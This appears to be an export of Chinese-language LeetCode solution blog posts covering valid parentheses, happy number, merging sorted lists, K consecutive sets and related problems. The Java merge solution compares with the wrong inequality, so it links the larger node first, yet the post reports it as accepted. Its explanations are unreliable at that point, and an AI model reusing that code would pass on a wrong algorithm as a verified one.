profit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="LIS-数量"><a href="#LIS-数量" class="headerlink" title="LIS 数量"></a>LIS 数量</h2><ol>
<li><p>定义问题</p>
<p>给定一个序列 $ X &#x3D; &lt;x_1, x_2, …, x_n&gt; $，如果 $ Z &#x3D; &lt;z_1, z_2, … z_i&gt; $ 是 X 的子序列，且满足：</p>
<p>$ z_i &gt; z_(i-1) $，则 Z 是 X 的递增子序列 ，其中元素最多的递增子序列叫做 X 的最长递增子序列 (LIS)</p>
</li>
<li><p>刻画 LIS 的特征</p>
<p>假设 $ Z &#x3D; &lt;z_1, z_2, … z_i&gt; $ 是 X 的一个 LIS，</p>
<ul>
<li>那么 $Z_i &gt; Z_(i-1)$</li>
</ul>
</li>
<li><p>求 LIS 的长度</p>
</li>
</ol>
<h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ol>
<li><p><a href="https://leetcode.com/problems/number-of-longest-increasing-subsequence/">https://leetcode.com/problems/number-of-longest-increasing-subsequence/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/longest-arithmetic-sequence/">https://leetcode.com/problems/longest-arithmetic-sequence/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/predict-the-winner/">https://leetcode.com/problems/predict-the-winner/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/minimum-ascii-delete-sum-for-two-strings/">https://leetcode.com/problems/minimum-ascii-delete-sum-for-two-strings/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/filling-bookcase-shelves/">https://leetcode.com/problems/filling-bookcase-shelves/</a></p>
</li>
</ol>
<h2 id="DP-AC"><a href="#DP-AC" class="headerlink" title="DP AC"></a>DP AC</h2><ul>
<li><p><a href="https://leetcode.com/problems/longest-continuous-increasing-subsequence/submissions/">https://leetcode.com/problems/longest-continuous-increasing-subsequence/submissions/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/delete-operation-for-two-strings/">https://leetcode.com/problems/delete-operation-for-two-strings/</a></p>
</li>
<li><p><a href="https://leetcode.com/problems/number-of-longest-increasing-subsequence/">https://leetcode.com/problems/number-of-longest-increasing-subsequence/</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title>1296. Divide Array in Sets of K Consecutive Numbers</title>
    <url>/fundamental/algorithm/lc-1296-divide-array-in-sets-of-k-consecutive-numbers/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>题目描述 - <a href="https://leetcode.com/problems/divide-array-in-sets-of-k-consecutive-numbers">https://leetcode.com/problems/divide-array-in-sets-of-k-consecutive-numbers</a><br>给定一个数组 nums 和整数 k，判断是否将数组 nums 分成有 k 个连续数字组成的若干子数组。</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3,3,4,4,5,6], k = 4</span><br><span class="line">Output: true</span><br><span class="line">Explanation: Array can be divided into [1,2,3,4] and [3,4,5,6].</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: nums = [1,2,3,4], k = 3</span><br><span class="line">Output: false</span><br><span class="line">Explanation: Each array should be divided in subarrays of size 3.</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>统计每个数字出现的次数放在一个 map 中，然后从最小元素开始暴力循环，只要 map 不为空，求得 map 中当前最小值 cur, 从 cur 开始，对于任意 0 到 k 满足：</p>
<ol>
<li>cur 存在 map 中 (cur in map)</li>
<li>map[cur] 减 1 后，如果 map[cur] 已经为 0 则删除 cur 这个 key</li>
<li>cur +&#x3D; 1</li>
</ol>
<p>则说明可以被划分成多份 k 个连续的子数组，否则不可以。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isPossibleDivide</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="built_in">map</span> = collections.Counter(nums)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">map</span>:</span><br><span class="line">            cur = <span class="built_in">min</span>(<span class="built_in">map</span>.keys())</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">                <span class="keyword">if</span> cur <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="built_in">map</span>[cur] -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">map</span>[cur] == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">del</span> <span class="built_in">map</span>[cur]</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>提交后一遍通过。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Greedy</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-20 —— Valid Parentheses</title>
    <url>/fundamental/algorithm/lc-20-valid-parentheses/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given a string containing just the characters <code>&#39;(&#39;</code>, <code>&#39;)&#39;</code>, <code>&#39;{&#39;</code>, <code>&#39;}&#39;</code>, <code>&#39;[&#39;</code> and <code>&#39;]&#39;</code>, determine if the input string is valid.</p>
<p>An input string is valid if:</p>
<ol>
<li>Open brackets must be closed by the same type of brackets.</li>
<li>Open brackets must be closed in the correct order.</li>
</ol>
<p>Note that an empty string is also considered valid.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;()&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;()[]&#123;&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;(]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<p><strong>Example 4:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;([)]&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>

<p><strong>Example 5:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;&#123;[]&#125;&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>

<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><p>根据题意，每个输入都有解，因此数组元素个数一定是大于 2 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 空字符串 和 null</span></span><br><span class="line"><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="literal">null</span></span><br><span class="line"><span class="comment">// 右括号开头 </span></span><br><span class="line"><span class="string">&quot;)()(&quot;</span></span><br><span class="line"><span class="comment">// 字符串长度为奇数</span></span><br><span class="line"><span class="string">&quot;()()(&quot;</span></span><br><span class="line"><span class="comment">// 正常测试用例</span></span><br><span class="line"><span class="string">&quot;((&#123;&#125;[])())&quot;</span></span><br><span class="line"><span class="comment">// 只有右括号</span></span><br><span class="line"><span class="string">&quot;((((&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>如果一个有括号组成的字符串是“有效的”，那么这个字符串应该具有以下特点：</p>
<ul>
<li>字符串的长度应该是偶数</li>
<li>字符串中的括号有顺序的成对出现</li>
</ul>
<p>基于以上两个特点，我们只需要遍历字符串，然后检查每个左括号是否有合法的右括号，具体操作时，可以采用消去法，如下图示意，</p>
<p><img src="/images/2019-07/lc-20-1.jpg"></p>
<p>在没有遇到左括号时，我们不知道它是否能成功配对，因此我们需要先将<strong>其存储</strong>，直到遇到与之配对的右括号时<strong>再消去</strong>。从左往右遍历，观察不难发现，多个相连的左括号中，<strong>越靠左的越先访问到，却越往后被消去</strong>（先进后出），所以我们可以毫不犹豫的选择使用 Stack 存储优先访问到左括号，当遍历完成后，如果 Stack 中的所有左括号都被消去(Stack 为空)，则说明是“有效”字符串。综上所述，得出以下特性，</p>
<ol>
<li>右括号开头一定不满足</li>
<li>基于 1 的推广，栈空条件下遇到右括号也一定不满足</li>
<li>null 一定不满足，但是题目交代了空字符认为满足</li>
<li>字符串长度为奇数的一定也不满足</li>
</ol>
<h2 id="使用-Stack-解题"><a href="#使用-Stack-解题" class="headerlink" title="使用 Stack 解题"></a>使用 Stack 解题</h2><p><strong>预备知识</strong></p>
<ul>
<li><p>位运算判断整数的奇偶性</p>
<p>一个整数在表示为二进制时，某位非 0 即 1，因此该整数和 1 按位与，如果是奇数（末位是1）则结果为 1，否则结果为  0</p>
</li>
<li><p>运算符的优先级</p>
<p>运算符的优先级中， &#x3D;&#x3D; 优先于 &amp; 优先于 ||</p>
<p>建议： 如果记不住优先级顺序可以使用 <code>()</code></p>
</li>
<li><p>Java 中的 foreach 循环</p>
<p>遍历数组时，如果我们并不关心每个元素的索引，那么可以使用 foreach，语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] examples = &#123;<span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x: examples) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">  	<span class="comment">// x on behalf of each item</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Java 中的 Stack</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>想要的操作</th>
<th>提供的方法</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查看栈顶元素</td>
<td>peek()</td>
<td></td>
</tr>
<tr>
<td>弹出栈顶元素</td>
<td>pop()</td>
<td></td>
</tr>
<tr>
<td>压栈</td>
<td>push()</td>
<td></td>
</tr>
<tr>
<td>判断栈是否为空</td>
<td>empty() 或者 isEmpty()</td>
<td>实现的接口不同，所以方法差异</td>
</tr>
</tbody></table>
<p><strong>程序设计</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="literal">null</span> == s || (s.length() &amp; <span class="number">1</span>) == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        Stack&lt;Character&gt; parentheses = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> x: s.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeftBracket(x)) &#123;</span><br><span class="line">                parentheses.push(x);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parentheses.empty()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">char</span> <span class="variable">leftBracket</span> <span class="operator">=</span> parentheses.pop();</span><br><span class="line">                <span class="keyword">if</span> (!isMatch(leftBracket, x)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parentheses.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>isLeftBracket()</code> 方法用于判断字符是否是左括号，实现可以参考如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">char</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x == <span class="string">&#x27;(&#x27;</span> || x == <span class="string">&#x27;[&#x27;</span> || x == <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>isMatch()</code>  用于判断左右两个括号是否匹配，查看了 ASCII 后发现左右括号的 ASCII 相差 1 或 2，具体参考如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isMatch</span><span class="params">(<span class="type">char</span> left, <span class="type">char</span> right)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (left == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> right - left == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> right - left == <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>提交后，运行时 1ms，打败 98.31%</p>
<p><img src="/images/2019-07/lc-20-2.png"></p>
<h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul>
<li><a href="https://leetcode.com/problems/valid-parentheses/discuss/9178/Short-java-solution">大神们的骚操作</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-202 Happy Number</title>
    <url>/fundamental/algorithm/lc-202-happy-number/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Write an algorithm to determine if a number is “happy”.</p>
<p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p>
<span id="more"></span>

<p><strong>Example:</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: 19</span><br><span class="line">Output: true</span><br><span class="line">Explanation: </span><br><span class="line">12 + 92 = 82</span><br><span class="line">82 + 22 = 68</span><br><span class="line">62 + 82 = 100</span><br><span class="line">12 + 02 + 02 = 1</span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>Happy Number 按照计算规则最终会止于 1，来看一个非 Happy Number 的会怎样，我们尝试一下 20，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 -&gt; 4 -&gt; 16 -&gt; 37 -&gt; 58 -&gt; 90 -&gt; 81</span><br><span class="line">                  ^                 |</span><br><span class="line">                  |                 v</span><br><span class="line">                  |                 65</span><br><span class="line">                  |                 |</span><br><span class="line">                  |                 v</span><br><span class="line">                  61 &lt;- 56 &lt;- 64 &lt;- 80 </span><br></pre></td></tr></table></figure>

<p>观察发现，非 Happy Number 按照计算规则生成的数据链会成环，最终无法终止。所以我们只需要将计算结果保存在 HashMap 中，按照计算规则生成一个数时判断这个数是否在 HashMap 中，如果存在则说明会成环，该数不是 Happy Number。</p>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p>按照如上分析，程序设计时拆分两个步骤，</p>
<ol>
<li>按照计算规则生成下一个数</li>
<li>判断是否是 Happy Number</li>
</ol>
<p>代码如下，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isHappy</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        memo = &#123;&#125;</span><br><span class="line">        <span class="built_in">next</span> = n</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">next</span> = <span class="variable language_">self</span>.genarate(<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">next</span> == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> memo.get(<span class="built_in">next</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            memo[<span class="built_in">next</span>] = <span class="literal">True</span></span><br><span class="line">               </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">genarate</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>genarate</code> 函数按照规则生成新的值，实现如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">genarate</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>):</span><br><span class="line">        d = n % <span class="number">10</span></span><br><span class="line">        <span class="built_in">sum</span> += d * d</span><br><span class="line">        n = n // <span class="number">10</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br></pre></td></tr></table></figure>

<p>提交后 AC，完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isHappy</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        memo = &#123;&#125;</span><br><span class="line">        <span class="built_in">next</span> = n</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">next</span> = <span class="variable language_">self</span>.genarate(<span class="built_in">next</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">next</span> == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> memo.get(<span class="built_in">next</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            memo[<span class="built_in">next</span>] = <span class="literal">True</span></span><br><span class="line">               </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">genarate</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (n != <span class="number">0</span>):</span><br><span class="line">            d = n % <span class="number">10</span></span><br><span class="line">            <span class="built_in">sum</span> += d * d</span><br><span class="line">            n = n // <span class="number">10</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sum</span></span><br></pre></td></tr></table></figure>

<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>由分析得出，本体的关键点在于判断是否成环，以上解法使用 HashMap (或 HashSet)，空间复杂度为 O(n)，n 为链表的长度，如果要优化空间复杂度可以使用 <a href="https://en.wikipedia.org/wiki/Cycle_detection">Floyd 判断圈算法</a>。Leetcode 题目之 <a href="https://leetcode.com/problems/linked-list-cycle/">Linked List Cycle</a> 解法参考以前写的文章 <a href="https://0x400.com/2019-01-19-algorithm-find-circle-linked-list.html">链表有环</a></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-21 —— Merge two sorted lists</title>
    <url>/fundamental/algorithm/lc-21-merge-two-sorted-lists/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Merge two sorted linked lists and return it as a new list. The new list should be made by splicing together the nodes of the first two lists.</p>
<p><strong>Example:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;4, 1-&gt;3-&gt;4</span><br><span class="line">Output: 1-&gt;1-&gt;2-&gt;3-&gt;4-&gt;4</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>合并两个有序链表，合并后的链表也应是有序的，而且重复元素不去重</p>
<p>假设有 a, b 两个链表，考虑以下 corner case:</p>
<ul>
<li>其中一个链表为 null</li>
<li>a 的末尾元素大于 b 的首元素</li>
<li>a 的元素个数比 b 多</li>
</ul>
<p>常规的解法就是遍历两个列表，为新生成的链表维护一个头指针 <code>dummyHead</code> 和一个滑动指针<code>cur</code>，另外分别为两个给定的链表维护一个指针，假设为 <code>a</code>, <code>b</code>，按如下规则遍历</p>
<ol>
<li>初始化 dummyHead 和 cur， 让 dummyHead &#x3D; cur</li>
<li>初始化 a, b 分别指向两个链表的头节点</li>
<li>比较 a, b ，让小的一个节点作为 cur 的 next 节点，并且指针向后移动一位, cur 同样向后移动一位</li>
<li>重复 3，直到 a, b 两个指针之一为空</li>
<li>如果 a, b 中还有非空指针，让其作为 cur 的 next 节点</li>
<li>返回 dummyHead 的 next 节点</li>
</ol>
<h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> cur;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> &amp;&amp; l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1.val &gt; l2.val) &#123;</span><br><span class="line">                cur.next = l1;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cur.next = l2;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            cur.next = l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            cur.next = l2;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>值得注意的是，此处采用 <code>dummyHead</code> 作为新链表的头节点，最终返回了 <code>dummyHead.next</code>，这样做（比起先比较 L1 和 L2 的头节点然后选中较小者作为新链表的头节点）将特殊问题一般化，减少了特殊逻辑的处理，是很值得学习的一种思路。</strong></p>
<p>如上代码，提交后运行时 0 ms, 打败 100% 的提交。</p>
<p><img src="/images/2019-07/lc-21-1.png"></p>
<h2 id="其他解法"><a href="#其他解法" class="headerlink" title="其他解法"></a>其他解法</h2><ul>
<li><a href="https://leetcode.com/problems/merge-two-sorted-lists/discuss/9715/Java-1-ms-4-lines-codes-using-recursion">递归解法</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>LinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-241 —— different ways to add parentheses</title>
    <url>/fundamental/algorithm/lc-241-different-ways-to-add-parentheses/</url>
    <content><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个有数字和运算符组成的字符串，计算不同优先级的情况下的返回结果。</p>
<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: &quot;2*3-4*5&quot;</span><br><span class="line">Output: [-34, -14, -10, -10, 10]</span><br><span class="line">Explanation: </span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>对于每个运算表达式，我们可以分解为 <code>A op B</code> 的形式。当 <code>A </code> 和 <code>B</code> 都是数字时，直接返回计算结果，否则拆分表达式。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2*3-4*5 split to =&gt;</span><br><span class="line">(2) * (B) or (2*3)-(B)</span><br></pre></td></tr></table></figure>



<p>所以如下递归求解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">x, op, y</span>):</span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> x + y</span><br><span class="line">    <span class="keyword">if</span> op == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> x - y</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x * y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">input</span>.isdigit():</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(<span class="built_in">input</span>)]</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">input</span>):</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&quot;+-*&quot;</span>:</span><br><span class="line">            left = solve(<span class="built_in">input</span>[:i])</span><br><span class="line">            right = solve(<span class="built_in">input</span>[i+<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> left:</span><br><span class="line">                <span class="keyword">for</span> r <span class="keyword">in</span> right:</span><br><span class="line">                    ans.append(calc(l, c, r))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Recursion</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode-35 —— Search Insert Position</title>
    <url>/fundamental/algorithm/lc-35-search-insert-position/</url>
    <content><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.</p>
<p>You may assume no duplicates in the array.</p>
<span id="more"></span>

<p><strong>Example 1:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5,6], 5</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>

<p><strong>Example 2:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5,6], 2</span><br><span class="line">Output: 1</span><br></pre></td></tr></table></figure>

<p><strong>Example 3:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5,6], 7</span><br><span class="line">Output: 4</span><br></pre></td></tr></table></figure>

<p><strong>Example 4:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: [1,3,5,6], 0</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure>



<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在一个给定的有序数组中查找给定的值，如果找到返回该值在数组中的位置，否则返回该值所应该处于的位值。</p>
<p>给定的数组是有序的，而且已经假设没有重复的元素，显然二分查找是一种比较容易想到的解决方案。解决问题时，考虑以下 corner case,</p>
<ol>
<li>给定的数组为空或 null</li>
<li>给定的 target 比数组最小值小</li>
<li>给定的 target 比数组最大值大</li>
</ol>
